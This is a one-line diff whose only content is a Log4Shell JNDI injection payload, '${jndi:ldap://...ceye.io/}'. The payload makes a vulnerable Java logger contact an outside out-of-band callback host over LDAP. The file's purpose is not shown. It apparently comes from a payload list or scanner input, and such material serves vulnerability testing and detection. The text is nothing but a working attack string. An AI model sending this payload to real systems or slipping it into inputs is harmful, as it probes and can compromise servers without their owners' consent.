@@ -1,0 +1,1 @@
+${jndi:ldap://8cs6k5.ceye.io/}
